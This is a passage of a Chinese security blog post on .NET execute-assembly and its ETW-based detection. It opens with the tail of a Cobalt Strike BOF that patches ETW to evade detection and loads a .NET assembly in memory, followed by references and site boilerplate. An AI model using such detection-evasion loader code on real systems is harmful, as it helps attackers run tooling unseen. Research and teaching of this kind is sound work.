iMetaHost-&gt;lpVtbl-&gt;Release(iMetaHost);</div><div class="line">	OLE32$CoUninitialize();</div><div class="line">	<span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> go(<span class="keyword">char</span>* args, <span class="keyword">int</span> length)</div><div class="line">&#123;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] go go go"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(PatchETW() == <span class="literal">TRUE</span>)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>,<span class="string">"patch etw Success"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	datap  parser;</div><div class="line">	BeaconDataParse(&amp;parser, args, length);</div><div class="line">	<span class="keyword">char</span>* AssemblyBytes = BeaconDataExtract(&amp;parser, <span class="literal">NULL</span>);</div><div class="line">	DWORD AssemblyLength = BeaconDataInt(&amp;parser);</div><div class="line">	<span class="keyword">char</span>* AssemblyArguments = BeaconDataExtract(&amp;parser, <span class="literal">NULL</span>);</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] AssemblyArguments: %s and AssemblyLength :%d "</span>, AssemblyArguments, AssemblyLength);</div><div class="line"></div><div class="line">	<span class="keyword">wchar_t</span>* wNetVersion = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">if</span> (FindVersion(AssemblyBytes, AssemblyLength) == <span class="literal">TRUE</span>)</div><div class="line">	&#123;</div><div class="line">		wNetVersion = L<span class="string">"v4.0.30319"</span>;</div><div class="line">		<span class="comment">//toWideChar("v4.0.30319", wNetVersion, 22);</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		wNetVersion = L<span class="string">"v2.0.50727"</span>;</div><div class="line">		<span class="comment">//toWideChar("v2.0.50727", wNetVersion, 22);</span></div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] wNetVersion is %ls"</span>, wNetVersion);</div><div class="line"></div><div class="line">	<span class="comment">////将Assembly参数转化为WCHAR类型</span></div><div class="line">	size_t convertedChars = <span class="number">0</span>;</div><div class="line">	<span class="keyword">wchar_t</span>* wAssemblyArguments = <span class="literal">NULL</span>;</div><div class="line">	DWORD wideSize = MSVCRT$strlen(AssemblyArguments) + <span class="number">1</span>;</div><div class="line">	wAssemblyArguments = (<span class="keyword">wchar_t</span>*)MSVCRT$malloc(wideSize * <span class="keyword">sizeof</span>(<span class="keyword">wchar_t</span>));</div><div class="line">	MSVCRT$mbstowcs_s(&amp;convertedChars, wAssemblyArguments, wideSize, AssemblyArguments, _TRUNCATE);</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] wAssemblyArguments is %ls"</span>, wAssemblyArguments);</div><div class="line"></div><div class="line">	<span class="keyword">int</span> NumArgs = <span class="number">0</span>;</div><div class="line">	LPWSTR* ArgumentsArray = <span class="literal">NULL</span>;</div><div class="line">	ArgumentsArray = SHELL32$CommandLineToArgvW(wAssemblyArguments, &amp;NumArgs);</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] ArgumentsArray is %ls"</span>, wAssemblyArguments);</div><div class="line"></div><div class="line">	AssemblyLoad(wNetVersion, AssemblyBytes, AssemblyLength, ArgumentsArray, NumArgs);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
+<li><a href="https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/" target="_blank" rel="external">Shellcode: Loading .NET Assemblies From Memory</a></li>
+<li><a href="https://github.com/microsoft/krabsetw/blob/master/krabs/README.md" target="_blank" rel="external">https://github.com/microsoft/krabsetw/blob/master/krabs/README.md</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/153199835" target="_blank" rel="external">NuGet的使用</a></li>
+<li><a href="https://github.com/microsoft/krabsetw/blob/master/examples/NativeExamples/user_trace_001.cpp" target="_blank" rel="external">krabsetw例子说明</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1785567" target="_blank" rel="external">CobaltStrike 插件编写指南</a></li>
+<li><a href="http://sleep.dashnine.org/manual/index.html" target="_blank" rel="external">http://sleep.dashnine.org/manual/index.html</a></li>
+<li><a href="https://github.com/anthemtotheego/InlineExecute-Assembly/blob/main/README.md" target="_blank" rel="external">InlineExecute-Assembly</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/02/20/detect thread Inject——以Get-InjectedThread为例/" rel="next" title="detect threat inject —— 以Get-InjectedThread为例">
+                <i class="fa fa-chevron-left"></i> detect threat inject —— 以Get-InjectedThread为例
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">HaCky</p>
+              <p class="site-description motion-element" itemprop="description">我是最菜的HaCky呀</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">83</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Execute-Assembly-原理"><span class="nav-number">1.</span> <span class="nav-text">0x01 Execute-Assembly 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Execute-Assembly检测思路"><span class="nav-number">2.</span> <span class="nav-text">0x02 Execute-Assembly检测思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-1-ETW使用前置知识"><span class="nav-number">2.1.</span> <span class="nav-text">0x2.1 ETW使用前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-2-krabsetw安装与使用"><span class="nav-number">2.2.</span> <span class="nav-text">0x2.2 krabsetw安装与使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-3-加载程序集"><span class="nav-number">2.3.</span> <span class="nav-text">0x2.3 加载程序集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-绕过上述检测"><span class="nav-number">3.</span> <span class="nav-text">0x03 绕过上述检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-1-脚本学习"><span class="nav-number">3.1.</span> <span class="nav-text">0x3.1  脚本学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-2-BOF编写"><span class="nav-number">3.2.</span> <span class="nav-text">0x3.2 BOF编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文献"><span class="nav-number">4.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HaCky</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
